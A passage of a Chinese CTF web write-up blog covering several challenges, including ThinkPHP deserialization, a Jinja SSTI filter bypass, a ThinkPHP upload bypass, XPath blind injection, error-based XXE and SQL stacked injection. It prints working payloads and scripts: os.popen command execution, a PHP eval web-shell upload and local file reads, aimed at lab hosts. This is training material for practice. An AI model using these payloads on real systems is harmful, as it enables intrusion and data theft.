&amp;#125;
$a = new Pivot();
$b = new Pivot($a);
$c = array($b);
echo urlencode(serialize($c));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;phpgcc 好像搞不了（首字母不能是 O，在&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./phpggc -u ThinkPHP/RCE2 &#39;system(&amp;quot;cat /flag&amp;quot;);&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;出来的时候是 O 开头）&lt;/p&gt;
&lt;p&gt;仔细的反序列化过程：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ3OT91X2F0b2tlbj1lMTk4M2NjYTcxMTViYjczZGM4MjYxMzk1ZjM4ZTQyOCZhbXA7dV9hc2lnPTFhMGMzOTlhMTcyNzA3ODI1MzU5OTM0NzdlMDAzNQ==&#34;&gt;https://xz.aliyun.com/t/6479?u_atoken=e1983cca7115bb73dc8261395f38e428&amp;amp;u_asig=1a0c399a17270782535993477e0035&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;gwctf2019你的名字&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gwctf2019你的名字&#34;&gt;#&lt;/a&gt; [GWCTF2019] 你的名字&lt;/h2&gt;
&lt;h2 id=&#34;3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/3.png&#34; alt=&#34;3&#34;&gt;&lt;/h2&gt;
&lt;p&gt;进去就是一个 ssti 经典：好多东西被禁了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;&amp;#125;&amp;#125;，union,select,/,/**/ 
这是被禁了，会在后面加上！禁了&amp;#123;&amp;#123;&amp;#125;&amp;#125;还以为不是ssti了
然后就没了，虽然知道了也不会做········
它用了&amp;#123;%print %&amp;#125;这种形式，这样就能打印出执行信息了
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;试了下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;%print lipsum %&amp;#125;，
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/4.png&#34; alt=&#34;4&#34;&gt; 终于有回显了，有回显了就好开始下面的构造了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;这里还得补充一点，&amp;#123;%print %&amp;#125;形式下，若果你构造的payload是正常的ssti用到的语句却没有回显，就说明你的语句中可能有关键字被过滤了，如&amp;#123;%print &#39;&#39;.class %&amp;#125;执行之后没有任何的回显，但&amp;#123;%print &#39;&#39;.clconfigass %&amp;#125;成功执行有回显，这说明class被过滤了
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本体的黑名单源代码：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../../../../AppData/Roaming/Typora/typora-user-images/image-20240922205525074.png&#34; alt=&#34;image-20240922205525074&#34;&gt;&lt;/p&gt;
&lt;p&gt;这过滤代码挺傻的，是先从黑名单中取出一个字符串经过循环过滤再进行下一个字符串的过滤，因为 config 字符串是在黑名单的最后一个，所以黑名单中前面字符串的过滤都已经结束了，再进行 config 的过滤，所以我们在过滤字符中加入 config 就可以绕过&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;所以最终的 payload 可以写成如下形式&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;%print lipsum.__globals__.__builconfigtins__.__impoconfigrt__(&#39;oconfigs&#39;).poconfigpen(&#39;whoami&#39;).read()%&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;也可以拼接绕过&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;%print lipsum.__globals__[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;__im&#39;+&#39;port__&#39;](&#39;o&#39;+&#39;s&#39;)[&#39;po&#39;+&#39;pen&#39;](&#39;whoami&#39;).read()%&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后的 payload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;%set a=&#39;__bui&#39;+&#39;ltins__&#39;%&amp;#125;
&amp;#123;%set b=&#39;__im&#39;+&#39;port__&#39;%&amp;#125;
&amp;#123;%set c=&#39;o&#39;+&#39;s&#39;%&amp;#125;
&amp;#123;%set d=&#39;po&#39;+&#39;pen&#39;%&amp;#125;
&amp;#123;%print(lipsum[&#39;__globals__&#39;][a][b](c)[d](&#39;cat /flag_1s_Hera&#39;)[&#39;read&#39;]())%&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;**用&amp;#123;%print %&amp;#125;解决了回显问题，网上的其他大多数文章为了解决无法回显的问题大多是选择外带的形式**
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;

 &lt;h2 id=&#34;roarctf2019simpleupload&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#roarctf2019simpleupload&#34;&gt;#&lt;/a&gt; [RoarCTF2019]SimpleUpload&lt;/h2&gt;
&lt;p&gt;推荐链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pbmFuYi5naXRodWIuaW8vMjAyMS8wOS8xNS9Sb2FyQ1RGLTIwMTktU2ltcGxlLVVwbG9hZC8=&#34;&gt;https://inanb.github.io/2021/09/15/RoarCTF-2019-Simple-Upload/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;lt;?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
&amp;#123;
    public function index()
    &amp;#123;
        show_source(__FILE__);
    &amp;#125;
    public function upload()
    &amp;#123;
        $uploadFile = $_FILES[&#39;file&#39;] ;

        if (strstr(strtolower($uploadFile[&#39;name&#39;]), &amp;quot;.php&amp;quot;) ) &amp;#123;
            return false;
        &amp;#125;

        $upload = new \Think\Upload();// 实例化上传类
        $upload-&amp;gt;maxSize  = 4096 ;// 设置附件上传大小
        $upload-&amp;gt;allowExts  = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);// 设置附件上传类型
        $upload-&amp;gt;rootPath = &#39;./Public/Uploads/&#39;;// 设置附件上传目录
        $upload-&amp;gt;savePath = &#39;&#39;;// 设置附件上传子目录
        $info = $upload-&amp;gt;upload() ;
        if(!$info) &amp;#123;// 上传错误提示错误信息
          $this-&amp;gt;error($upload-&amp;gt;getError());
          return;
        &amp;#125;else&amp;#123;// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload-&amp;gt;rootPath,1).$info[&#39;file&#39;][&#39;savepath&#39;].$info[&#39;file&#39;][&#39;savename&#39;] ;
          echo json_encode(array(&amp;quot;url&amp;quot;=&amp;gt;$url,&amp;quot;success&amp;quot;=&amp;gt;1));
        &amp;#125;
    &amp;#125;
&amp;#125; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;知识点：&lt;/p&gt;
&lt;p&gt;tp 默认上传目录：index.php/home/index/upload&lt;/p&gt;
&lt;p&gt;tp 支持多个文件上传&lt;/p&gt;
&lt;p&gt;tp 的文件上传用法这里不对，限定后缀应为 $upload-&amp;gt;exts，所以文件名过滤无效&lt;/p&gt;
&lt;p&gt;tp 上传默认命名方式受时间戳控制，所以时间间隔很短的上传文件名会大致一样&lt;/p&gt;
&lt;p&gt;解题方法：&lt;/p&gt;
&lt;p&gt;题目中会打印出来上传成功的不以.php 结尾的文件名，通过同时上传多个文件的方法拿到 php 两侧文件的文件名，然后根据不一样的位数爆破 php 文件名&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests
#from io import BytesIO

url=&amp;quot;http://cf4a0675-7522-4210-bbdf-0492504324b3.node4.buuoj.cn:81/index.php/home/index/upload&amp;quot;

files1 = &amp;#123;&#39;file&#39;: open(&#39;1.txt&#39;,&#39;r&#39;)&amp;#125;
files2 = &amp;#123;&#39;file[]&#39;: open(&#39;1.php&#39;,&#39;r&#39;)&amp;#125;

r = requests.post(url,files=files1)
print(r.text)

r = requests.post(url,files=files2)
print(r.text)

r = requests.post(url,files=files1)
print(r.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其他方法：直接上传 xxx.&amp;lt;&amp;gt;php 即可直接拿到文件名&lt;/p&gt;
&lt;p&gt;其他方法：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests
url = &amp;quot;http://83a80334-cdce-4f32-af7b-18f7d54b565f.node5.buuoj.cn:81/index.php/home/index/upload/&amp;quot;
s = requests.Session()
files = &amp;#123;&amp;quot;file&amp;quot;: (&amp;quot;shell.&amp;lt;&amp;gt;php&amp;quot;, &amp;quot;&amp;lt;?php eval($_GET[&#39;cmd&#39;])?&amp;gt;&amp;quot;)&amp;#125;
r = requests.post(url, files=files)
print(r.text)
&lt;/code&gt;&lt;/pre&gt;

 &lt;h2 id=&#34;npuctf2020ezlogin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#npuctf2020ezlogin&#34;&gt;#&lt;/a&gt; [NPUCTF2020]ezlogin&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/NPUCTF2020-ezlogin/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先发现一个&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;username&amp;gt;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;&amp;lt;/pwssword&amp;gt;&amp;lt;token&amp;gt;&amp;lt;/token&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;的模板，以为是 xss，注入半天搞不了，(content-type:application/xml) 结果是 xpath 注入:&lt;/p&gt;
&lt;h2 id=&#34;xpath注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xpath注入&#34;&gt;#&lt;/a&gt; &lt;strong&gt;xpath 注入&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/backlion/p/8554749.html&#34;&gt;&lt;strong&gt;xpath 注入详细介绍&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在我对 xpath 注入的理解是类似于 SQL 注入。&lt;/p&gt;
&lt;p&gt;在 xpath 中的查询语句为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;quot;/root/users/user[username/text()=&#39;&amp;quot;.$name.&amp;quot;&#39; and password/text()=&#39;&amp;quot;.$pwd.&amp;quot;&#39;]&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt;和&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;name和&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;和&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; pwd 是我们输入的字符，这里对字符没有经过任何的过滤。&lt;/p&gt;
&lt;p&gt;当 $name= admin‘ or 1=1 or ‘’=’&lt;/p&gt;
&lt;p&gt;拼接后的语句为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;quot;/root/users/user[username/text()=&#39;admin&#39; or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;&amp;quot;.$pwd.&amp;quot;&#39;]&amp;quot;;   //成为永真使，万能密码
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;值得注意的是在 xpath 的查询语句中没有注释。&lt;/p&gt;
&lt;p&gt;输入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&#39;or count(/)=1  or &#39;&#39;=&#39;     //count函数是查询节点个数
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/NPUCTF2020-ezlogin/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&#39;or count(/)=2  or &#39;&#39;=&#39; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/NPUCTF2020-ezlogin/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;存在有不同的特征值，可以用布尔盲注&lt;/p&gt;
&lt;p&gt;先附上一句 playload，并解释一下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/NPUCTF2020-ezlogin/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;在&lt;username&gt;里面的 {X} 中的 X 是一个变量，它指的是查询的元素 X 个字符，Y 也是一个变量，是指我们猜测的字符，如果 X=Y 那么就会返回 true，对应的我们的题目就会返回 “非法操作！”&lt;/p&gt;
&lt;p&gt;要注意的是，因为页面会不断的刷新，这个 token 的值也会一直变化，注意拿到最新的 token 值&lt;/p&gt;
&lt;p&gt;注意在第八行设置 head 时候千万不要用 cookie 和 UA，一定要有 content-type，我看其他人的脚本都有这个，结果爬出的数据都是 “超时” 的界面。&lt;/p&gt;
&lt;p&gt;最后爆出来直接登录在？flie=welcome 加入 php 伪协议（大小写去掉 read）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Php://filter/convert.Base64-Encode/resource=/flag
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/NPUCTF2020-ezlogin/5.png&#34; alt=&#34;5&#34;&gt; 参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbHRobHN5L3AvMTQ4NDMwNTIuaHRtbA==&#34;&gt;https://www.cnblogs.com/lthlsy/p/14843052.html&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;googlectf2019-qualsbnv&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#googlectf2019-qualsbnv&#34;&gt;#&lt;/a&gt; [GoogleCTF2019 Quals]Bnv&lt;/h2&gt;
&lt;p&gt;先 bp 抓包发现&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;是 json 数据：由 json 数据想到是 xxe 注入，再次基础上修改 Content-Type 为 application/xml, 发现是少了一个 &amp;lt;，感觉是少了一个 xml 文件的头，加一个&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;报错说是没找到 DTD 文件，添加 DTD 文件的实体&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ENTITY&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;xxe&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&#34;135601360123502401401250&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;message&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token entity named-entity&#34; title=&#34;&amp;xxe;&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;message&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;报错没有元素消息的声明&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到报错没有元素消息的声明，显然解析器需要在 DTD 中声明以定义的元素，有点像在使用变量之前声明变量。所以让我们给它想要的，我们要做的就是在 DTD 中声明消息，我们可以通过使用数据，指定名为 message 的元素来实现这一点，定义类型设置为 PC 数据，现在让我们继续尝试。&lt;/p&gt;
&lt;p&gt;这里得说一下 DTD&lt;br&gt;
 文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。带有 DTD 的 XML 文档实例&lt;br&gt;
&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;回显成功，通过外带数据的形式添加一&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/7.png&#34; alt=&#34;7&#34;&gt; 个外部实体来发出出口请求。&lt;/p&gt;
&lt;p&gt;未加载外部实体，需要使用内部 dtd 文件加载，（之前还用加载文件的方法，结果标记错误）&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后的数据：&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34;?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &amp;lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &amp;lt;!ENTITY % ISOamso &#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &amp;lt;!ENTITY &lt;span class=&#34;token entity&#34; title=&#34;&amp;#x25;&#34;&gt;&amp;amp;#x25;&lt;/span&gt; file SYSTEM &#34;file:///flag&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &amp;lt;!ENTITY &lt;span class=&#34;token entity&#34; title=&#34;&amp;#x25;&#34;&gt;&amp;amp;#x25;&lt;/span&gt; eval &#34;&amp;lt;!ENTITY &lt;span class=&#34;token entity&#34; title=&#34;&amp;#x26;&#34;&gt;&amp;amp;#x26;&lt;/span&gt;#x25; error SYSTEM &lt;span class=&#34;token entity&#34; title=&#34;&amp;#x27;&#34;&gt;&amp;amp;#x27;&lt;/span&gt;file:///aaaaa/&lt;span class=&#34;token entity&#34; title=&#34;&amp;#x25;&#34;&gt;&amp;amp;#x25;&lt;/span&gt;file;&lt;span class=&#34;token entity&#34; title=&#34;&amp;#x27;&#34;&gt;&amp;amp;#x27;&lt;/span&gt;&gt;&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token entity&#34; title=&#34;&amp;#x25;&#34;&gt;&amp;amp;#x25;&lt;/span&gt;eval;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token entity&#34; title=&#34;&amp;#x25;&#34;&gt;&amp;amp;#x25;&lt;/span&gt;error;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;%local_dtd;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5BGoogleCTF2019Quals%5DBnv/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NqZGdnL2FydGljbGUvZGV0YWlscy8xMTQ0MjAxNjA=&#34;&gt;https://blog.csdn.net/cjdgg/article/details/114420160&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;bsidescf-2020hurdles&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bsidescf-2020hurdles&#34;&gt;#&lt;/a&gt; [BSidesCF 2020]Hurdles&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BBSidesCF2020%5DHurdles/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BBSidesCF2020%5DHurdles/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;HTTP 请求中的 Header 参数:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE1MDcxMjYzL2FydGljbGUvZGV0YWlscy84MTAwMDMxMz9kZXB0aF8xLXV0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2smYW1wO3V0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2s=&#34;&gt;https://blog.csdn.net/qq_15071263/article/details/81000313?depth_1-utm_source=distribute.pc_relevant.none-task&amp;amp;utm_source=distribute.pc_relevant.none-task&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ni9hcnRpY2xlL2RldGFpbHMvMTEyMjk4NDEx&#34;&gt;https://blog.csdn.net/weixin_44037296/article/details/112298411&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;注意开始传参的时候记得加引号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注意开始传参的时候记得加引号&#34;&gt;#&lt;/a&gt; 注意：开始传参的时候记得加引号&lt;/h3&gt;

 &lt;h2 id=&#34;swpu2019web4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#swpu2019web4&#34;&gt;#&lt;/a&gt; [SWPU2019]Web4&lt;/h2&gt;
&lt;p&gt;考点：PDO 场景下的堆叠注入、时间盲注&lt;/p&gt;
&lt;p&gt;打开题目叫你登录，不过任凭你怎么登录都会没有反应，注册说 “未开放注册功能”&lt;/p&gt;
&lt;p&gt;回头一抓包，发现我们向  &lt;code&gt;/index.php?r=Login/Login&lt;/code&gt;  发送了一个数据包，这里可以注入，POST 输入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;:&amp;quot;1&#39;&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;123&amp;quot;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;页面会报错，但是我们输入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;:&amp;quot;1&#39;;&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;123&amp;quot;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;页面却没报错，同时说密码错误；&lt;/p&gt;
&lt;p&gt;那么说明这道题可以堆叠注入。&lt;/p&gt;
